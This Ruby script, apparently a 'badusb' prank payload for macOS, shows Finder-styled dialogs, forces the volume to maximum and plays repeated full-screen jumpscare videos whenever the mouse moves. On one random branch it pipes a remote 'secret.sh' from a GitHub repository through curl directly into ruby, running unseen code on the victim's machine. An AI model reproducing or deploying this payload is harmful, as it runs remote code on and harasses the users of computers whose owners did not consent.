#!/usr/bin/env ruby
require 'open-uri'
require 'tempfile'

# --- Helper Method: Display Dialog with Finder Icon using AppleScript ---
def display_dialog(message, buttons, default)
  button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
  ascript = %Q{display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}
  output = `osascript -e '#{ascript}'`
  if output =~ /button returned:(\S+)/
    return $1
  else
    return nil
  end
end

# --- Volume Control ---
def set_volume_to_max
  if system("command -v osascript > /dev/null 2>&1")
    system("osascript -e 'set volume output volume 100'")
  elsif system("command -v amixer > /dev/null 2>&1")
    system("amixer set Master 100%")
  else
    puts "Volume control not supported on this system."
  end
end

# --- Mouse Movement Detection ---
# Uses Python to query the seconds since the last mouse movement (via Quartz).
def mouse_moved_recently?(threshold = 0.1)
  # Use /usr/bin/python which should be available on macOS.
  output = `python -c "import Quartz; print(Quartz.CGEventSourceSecondsSinceLastEventType(0, 5))"`.strip
  seconds = output.to_f
  seconds < threshold
rescue
  false
end

# --- Create Temporary HTML for Full-Screen Jumpscare ---
def create_jumpscare_html(video_url)
  html_content = <<-HTML
<html>
  <head>
    <meta charset="UTF-8">
    <title>JumpScare</title>
    <style>
      html, body { margin: 0; padding: 0; height: 100%; background-color: black; }
      video { width: 100%; height: 100%; object-fit: cover; }
    </style>
  </head>
  <body>
    <video id="video" autoplay muted playsinline>
      <source src="#{video_url}" type="video/mp4">
      Your browser does not support the video tag.
    </video>
    <script>
      var video = document.getElementById('video');
      video.play();
      if (video.requestFullscreen) { video.requestFullscreen(); }
      else if (video.webkitRequestFullscreen) { video.webkitRequestFullscreen(); }
      else if (video.msRequestFullscreen) { video.msRequestFullscreen(); }
      video.muted = false;
      video.play();
    </script>
  </body>
</html>
  HTML
  temp = Tempfile.new(['jumpscare', '.html'])
  temp.write(html_content)
  temp.close
  temp.path
end

# --- Trigger a Full-Screen Jumpscare ---
# Opens Safari with a temporary HTML file that embeds the video.
def trigger_fullscreen_jumpscare(video_url, duration=1)
  set_volume_to_max
  html_file = create_jumpscare_html(video_url)
  system("open -a Safari '#{html_file}'")
  sleep duration
  system("osascript -e 'tell application \"Safari\" to close front window'")
end

# --- Branch: Run Secret Script ---
def run_secret_script
  system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
end

# --- Branch: Winner Jumpscare ---
def trigger_winner_jumpscare
  set_volume_to_max
  winner_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
  system("open -a Safari '#{winner_url}'")
end

# --- Main Program Flow ---

# First dialog: "Are you subscribed to my YouTube channel?"
subscribed = display_dialog("Are you subscribed to my YouTube channel?\n(https://www.youtube.com/channel/UC8L0XgGChOWiMQ0uM2lWbMg)", ["Yes", "No"], "Yes")

if subscribed.nil?
  puts "No response received. Exiting."
  exit 0
end

if subscribed.downcase == "no"
  # Not subscribed: Wait 1 second then trigger mouse-based jumpscare mode.
  sleep 1
  puts "Jumpscare mode activated. Move your mouse to trigger a jumpscare."
  jumpscare_count = 0
  cooldown = 10  # seconds between jumpscares
  last_jumpscare = Time.now - cooldown
  # Fixed raw link for jumpscare2.mp4
  jumpscare_video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
  
  while jumpscare_count < 10
    if mouse_moved_recently? && (Time.now - last_jumpscare >= cooldown)
      last_jumpscare = Time.now
      puts "Mouse movement detected! Triggering jumpscare #{jumpscare_count + 1}..."
      trigger_fullscreen_jumpscare(jumpscare_video_url, 1)
      jumpscare_count += 1
      sleep 5  # cooldown after each jumpscare trigger
    end
    sleep 0.1
  end
else
  # Subscribed: Prompt for button selection.
  button_choice = display_dialog("Choose a button:", ["Button A", "Button B"], "Button A")
  if button_choice.nil?
    puts "No button chosen. Exiting."
    exit 0
  end
  # Random 50/50 outcome.
  if rand < 0.5
    run_secret_script
  else
    `osascript -e 'display dialog "You won!" buttons {"OK"} default button "OK" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"'`
    trigger_winner_jumpscare
  end
end
